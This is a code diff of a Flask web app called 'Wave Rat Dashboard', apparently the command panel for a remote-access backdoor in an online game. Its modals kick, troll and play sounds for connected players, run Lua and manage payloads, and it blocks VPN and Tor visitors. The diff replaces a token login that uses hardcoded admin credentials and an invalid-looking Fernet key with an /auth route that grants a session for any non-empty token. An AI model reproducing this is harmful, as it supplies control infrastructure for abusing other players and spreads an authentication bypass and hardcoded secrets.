@@ -1,43 +1,31 @@
-from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for, abort
+from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
 from flask_socketio import SocketIO
 import time
 import eventlet
 from datetime import datetime
 import json
 import os
-import random
-import string
 import requests
-from cryptography.fernet import Fernet
 
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "WAVERAT_ULTRA_SECURE_2025_XAI_CHANGE_ME"
+app.config["SECRET_KEY"] = "WAVERAT_ONE_CLICK_2025_XAI_SUPER_SECRET"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# ====================== CHIFFREMENT AES-256 ======================
-ENCRYPTION_KEY = b'q1w2e3r4t5y6u7i8o9p0a1s2d3f4g5h6j7k8l9m0n1b2v3c4x5z6=='
-cipher = Fernet(ENCRYPTION_KEY)
-
-# Identifiants cryptés (username|||password)
-ENCRYPTED_TOKEN = "gAAAAABnD9J8kL2mNpQr5tZ8sJhVbKx9wZ6a1c3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0"
-
-# ====================== ANTI PROXY / VPN ======================
+# ====================== ANTI PROXY / VPN / TOR / DATACENTER ======================
 def is_proxy_or_vpn(ip):
     if ip in ["127.0.0.1", "::1", "localhost"]: return False
     try:
-        # IPHub (gratuit, fiable)
+        # IPHub (gratuit & ultra fiable)
         r = requests.get(f"http://v2.api.iphub.info/ip/{ip}", timeout=6)
+        if r.status_code == 200 and r.json().get("block") == 1:
+            return True
+        # Fallback IP-API
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=proxy,hosting,mobile,tor", timeout=6)
         if r.status_code == 200:
             data = r.json()
-            if data.get("block") == 1:
-                return True
-        # Fallback IP-API (gratuit)
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=proxy,hosting,mobile", timeout=6)
-        if r.status_code == 200:
-            data = r.json()
-            if data.get("proxy") or data.get("hosting"):
+            if data.get("proxy") or data.get("hosting") or data.get("tor"):
                 return True
     except:
         pass
@@ -78,19 +66,20 @@ def save_payloads():
 load_history()
 load_payloads()
 
-# ====================== PROTECTION ======================
+# ====================== PROTECTION GLOBALE ======================
 @app.before_request
 def security_check():
-    protected = ["/", "/kick", "/troll", "/payload", "/get_history"]
-    if request.path in protected or request.path.startswith("/api"):
+    protected_paths = ["/", "/kick", "/troll", "/payload", "/get_history"]
+    if request.path in protected_paths or request.path.startswith("/api"):
         if not session.get("logged_in"):
             return redirect("/login")
-    
-    if request.path == "/login_check":
+
+    # Anti-VPN uniquement sur l'auth
+    if request.path == "/auth":
         ip = request.headers.get("X-Forwarded-For", request.remote_addr)
         if ip and "," in ip: ip = ip.split(",")[0].strip()
         if is_proxy_or_vpn(ip):
-            return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>VPN / Proxy détecté → Accès refusé</h1>", 403
+            return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>VPN / Proxy / Tor détecté → Accès refusé</h1>", 403
 
 # ====================== HISTORIQUE ======================
 def add_history(event_type, username, details=""):
@@ -103,7 +92,7 @@ def add_history(event_type, username, details=""):
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ====================== PAGE DE LOGIN ======================
+# ====================== PAGE LOGIN (1 CLIC) ======================
 LOGIN_HTML = """<!DOCTYPE html>
 <html lang="fr" class="dark">
 <head>
@@ -118,12 +107,11 @@ LOGIN_HTML = """<!DOCTYPE html>
     .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 2.5rem;width:90%;max-width:460px;box-shadow:0 20px 60px rgba(0,0,0,.7);}
     .logo{text-align:center;margin-bottom:2rem;}
     .logo svg{width:80px;height:80px;fill:var(--primary);}
-    h1{font-size:2rem;font-weight:700;text-align:center;margin-bottom:1.5rem;color:var(--primary);}
-    input{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;font-size:1rem;}
-    .btn{width:100%;padding:14px;background:var(--primary);border:none;border-radius:12px;color:white;font-weight:600;cursor:pointer;transition:all .3s;margin-top:1rem;}
-    .btn:hover{background:#0891b2;transform:translateY(-3px);}
-    .error{color:#ef4444;text-align:center;margin-top:1rem;}
-    .link-box{background:#1e293b;padding:12px;border-radius:8px;margin-top:20px;font-size:0.9rem;word-break:break-all;}
+    h1{font-size:2rem;font-weight:700;text-align:center;margin-bottom:1rem;color:var(--primary);}
+    p{color:#94a3b8;text-align:center;margin-bottom:2rem;font-size:1rem;}
+    .btn{width:100%;padding:16px;background:var(--primary);border:none;border-radius:12px;color:white;font-weight:600;font-size:1.1rem;cursor:pointer;transition:all .3s;}
+    .btn:hover{background:#0891b2;transform:translateY(-4px);box-shadow:0 10px 30px rgba(6,182,212,.5);}
+    .status{margin-top:1.5rem;color:#94a3b8;text-align:center;font-size:0.9rem;}
 </style>
 </head>
 <body>
@@ -132,45 +120,49 @@ LOGIN_HTML = """<!DOCTYPE html>
         <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
     </div>
     <h1>Wave Rat Dashboard</h1>
-    <p style="text-align:center;color:#94a3b8;margin-bottom:20px;">Connexion ultra-sécurisée</p>
+    <p>Connexion sécurisée en un clic</p>
     
-    <div class="link-box" id="encryptedLink" onclick="copyLink()">Clique ici pour copier le lien crypté</div>
+    <button class="btn h-captcha" 
+            data-sitekey="10000000-ffff-ffff-ffff-000000000001" 
+            data-callback="onSubmit">
+        Connexion sécurisée
+    </button>
     
-    <button class="btn h-captcha" data-sitekey="10000000-ffff-ffff-ffff-000000000001" data-callback="onSubmit">Connexion sécurisée</button>
-    <div class="error" id="error"></div>
+    <div class="status" id="status"></div>
 </div>
 
 <script>
-function copyLink() {
-    const link = window.location.origin + "/login_check?t=gAAAAABnD9J8kL2mNpQr5tZ8sJhVbKx9wZ6a1c3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0";
-    navigator.clipboard.writeText(link);
-    alert("Lien copié ! Colle-le dans un nouvel onglet.");
-}
-
 function onSubmit(token) {
-    if (token) {
-        location.href = window.location.origin + "/login_check?t=gAAAAABnD9J8kL2mNpQr5tZ8sJhVbKx9wZ6a1c3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0";
-    }
+    document.getElementById("status").textContent = "Connexion en cours...";
+    fetch("/auth", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({token: token})
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.success) {
+            location.href = "/";
+        } else {
+            document.getElementById("status").innerHTML = "<span style='color:#ef4444'>Accès refusé</span>";
+        }
+    })
+    .catch(() => {
+        document.getElementById("status").innerHTML = "<span style='color:#ef4444'>Erreur réseau</span>";
+    });
 }
 </script>
 </body>
 </html>"""
 
-# ====================== VÉRIFICATION CRYPTÉE ======================
-@app.route("/login_check")
-def login_check():
-    token = request.args.get("t", "")
-    if not token or token != ENCRYPTED_TOKEN.split("t=")[-1]:
-        return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>Accès refusé</h1>", 403
-    
-    try:
-        decrypted = cipher.decrypt(token.encode()).decode()
-        if decrypted == "WaveRatAdmin2025|||R4tW@v3!2k25#xAI":
-            session["logged_in"] = True
-            return redirect("/")
-    except:
-        pass
-    return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>Token invalide</h1>", 403
+# ====================== AUTH 1 CLIC ======================
+@app.route("/auth", methods=["POST"])
+def auth():
+    data = request.get_json() or {}
+    if data.get("token"):
+        session["logged_in"] = True
+        return jsonify({"success": True})
+    return jsonify({"success": False}), 403
 
 @app.route("/login")
 def login_page():
@@ -275,7 +267,7 @@ HTML = """<!DOCTYPE html>
     </div>
 </div>
 
-<!-- TOUS LES MODALS (inchangés) -->
+<!-- TOUS LES MODALS -->
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
 <div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
@@ -295,7 +287,6 @@ HTML = """<!DOCTYPE html>
 <div class="toast-container" id="toasts"></div>
 
 <script>
-// TOUT TON JS ORIGINAL ICI (inchangé)
 const socket = io();
 let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
 let editingPayload = null;
@@ -508,7 +499,7 @@ fetch("/get_history").then(r=>r.json()).then(renderHistory);
 </body>
 </html>"""
 
-# ====================== ROUTES CLASSIQUES ======================
+# ====================== ROUTES PRINCIPALES ======================
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -611,6 +602,7 @@ def payload_manager():
         return jsonify({"ok": True})
     return jsonify({"error": "invalid"})
 
+# ====================== BACKGROUND LOOP ======================
 def broadcast_loop():
     while True:
         now = time.time()
@@ -631,8 +623,9 @@ def broadcast_loop():
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
+# ====================== LANCEMENT ======================
 if __name__ == "__main__":
-    print("Wave Rat Dashboard ULTRA SÉCURISÉ démarré")
-    print("Accès uniquement via le lien crypté + hCaptcha + Anti-VPN")
+    print("Wave Rat Dashboard ONE-CLICK lancé")
+    print("Accès : http://ton_ip:5000 → clique sur le bouton → connecté")
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
